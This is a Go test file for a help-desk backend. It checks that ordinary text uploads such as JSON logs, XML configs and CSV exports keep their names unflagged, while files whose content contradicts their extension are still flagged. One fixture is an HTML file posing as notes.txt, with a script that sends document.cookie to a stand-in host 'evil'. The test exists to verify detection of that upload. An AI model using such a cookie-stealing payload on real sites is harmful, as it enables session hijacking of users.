package server_test

import (
	"context"
	"encoding/json"
	"net/http"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/publiciallc/go-help-desk/backend/internal/domain/admin"
	"github.com/publiciallc/go-help-desk/backend/internal/domain/ticket"
)

// The files a help desk actually receives every day must arrive under the name
// they were sent with, unflagged and unwrapped.
//
// This is the test that should have existed first. The settled design claimed
// the content detector "leaves exactly two false positives, .js and .log" —
// a sentence nobody measured, including the person who wrote it. Measured, a
// container log is application/x-ndjson, an exported config is text/xml, a
// contact card is text/vcard. None of those were in the text set, so every one
// of them was treated as a file lying about itself: renamed to
// suspicious-<crc32>.zip and shown with a warning.
//
// A Kubernetes log landing on a ticket wrapped in an archive is the exact
// failure the design forbids — a warning that fires on ordinary files, which
// people learn to click past, which then buries the one file that really is
// lying.
func TestUpload_OrdinaryFilesAreNotTreatedAsSuspicious(t *testing.T) {
	h, cleanup := newHarness(t)
	defer cleanup()

	tk, err := h.ticketSvc.Create(context.Background(), ticket.CreateInput{
		Subject: "Ordinary", Description: "x", CategoryID: h.catID,
		ReporterUserID: &h.staffID,
	})
	require.NoError(t, err)

	cases := []struct {
		name     string
		filename string
		content  string
	}{
		{
			name:     "a container log, which is JSON on every line",
			filename: "app.log",
			content: `{"level":"info","ts":"2026-09-23T10:00:00Z","msg":"started"}` + "\n" +
				`{"level":"warn","ts":"2026-09-23T10:00:01Z","msg":"slow query"}` + "\n",
		},
		{
			name:     "a single JSON document saved as a log",
			filename: "response.log",
			content:  `{"status":500,"error":"upstream timeout","retries":3}`,
		},
		{
			name:     "an exported config",
			filename: "settings.txt",
			content:  `<?xml version="1.0" encoding="UTF-8"?><config><timeout>30</timeout></config>`,
		},
		{
			name:     "a spreadsheet export saved as text",
			filename: "export.txt",
			content:  "name,email,department\nA B,a@example.com,IT\n",
		},
		{
			name:     "a plain log, which is the case that always worked",
			filename: "plain.log",
			content:  "2026-09-23 10:00:00 INFO started\n2026-09-23 10:00:01 INFO ready\n",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := uploadNamed(t, h, tk.ID.String(), tc.filename, []byte(tc.content))
			res.Body.Close()
			require.Equal(t, http.StatusCreated, res.StatusCode)

			got := attachmentNamedAnyOf(t, h, tk.ID.String(), tc.filename)
			require.Equal(t, tc.filename, got.Filename,
				"an ordinary file must keep its own name, not become an archive of itself")
			require.NotNil(t, got.ContentMismatch)
			require.False(t, *got.ContentMismatch,
				"text under a text extension is not a file lying about itself")
		})
	}
}

// And the deception the control exists for still fires. Without this, widening
// the text rule could be "fixed" all the way to flagging nothing.
func TestUpload_TextThatIsNotInertIsStillFlagged(t *testing.T) {
	h, cleanup := newHarness(t)
	defer cleanup()

	tk, err := h.ticketSvc.Create(context.Background(), ticket.CreateInput{
		Subject: "Still flagged", Description: "x", CategoryID: h.catID,
		ReporterUserID: &h.staffID,
	})
	require.NoError(t, err)

	// The wrap is what this asserts, and it is an operator setting that
	// defaults to refusing instead. On a default instance the upload below is
	// a 415, which is the other half of the same control and is pinned in
	// handler_attachments_mismatch_handling_test.go.
	require.NoError(t, h.adminSvc.SetString(context.Background(),
		admin.KeyAttachmentMismatchHandling, admin.MismatchHandlingWrap))

	// HTML is the one textual type that runs when it is opened, because a
	// browser is what opens it.
	res := uploadNamed(t, h, tk.ID.String(), "notes.txt",
		[]byte(`<html><body><script>fetch('//evil/'+document.cookie)</script></body></html>`))
	res.Body.Close()
	require.Equal(t, http.StatusCreated, res.StatusCode)

	list := attachmentsOverHTTP(t, h, tk.ID.String())
	require.Len(t, list, 1)
	require.True(t, strings.HasPrefix(list[0].Filename, "suspicious-"),
		"HTML wearing a .txt is still wrapped: %q", list[0].Filename)
	require.NotNil(t, list[0].ContentMismatch)
	require.True(t, *list[0].ContentMismatch)

	// A .pdf whose content is plain text is a contradiction too: "it is only
	// text" must not become a blanket excuse for a claimed binary format.
	//
	// Flagged but not wrapped, and the difference is the rule working. Plain
	// text is on this instance's allowlist, so the content is something it
	// would have accepted under its own name — there is nothing to contain,
	// only something to say. Wrapping would be the warning-on-ordinary-files
	// problem again, one tier up.
	res2 := uploadNamed(t, h, tk.ID.String(), "report.pdf", []byte("this is not a PDF at all\n"))
	res2.Body.Close()
	require.Equal(t, http.StatusCreated, res2.StatusCode)

	pdf := attachmentNamedAnyOf(t, h, tk.ID.String(), "report.pdf")
	require.NotNil(t, pdf.ContentMismatch)
	require.True(t, *pdf.ContentMismatch,
		"a .pdf holding plain text still contradicts its name")
	require.Equal(t, "report.pdf", pdf.Filename,
		"an allowed detected type is flagged, not wrapped")
}

// attachmentsOverHTTP is the list as a client sees it. Named to avoid
// colliding with the existing helper of the obvious name.
func attachmentsOverHTTP(t *testing.T, h *harness, ticketID string) []ticket.Attachment {
	t.Helper()
	res := h.do(t, http.MethodGet, "/api/v1/tickets/"+ticketID+"/attachments", nil)
	defer res.Body.Close()
	var list []ticket.Attachment
	require.NoError(t, json.NewDecoder(res.Body).Decode(&list))
	return list
}
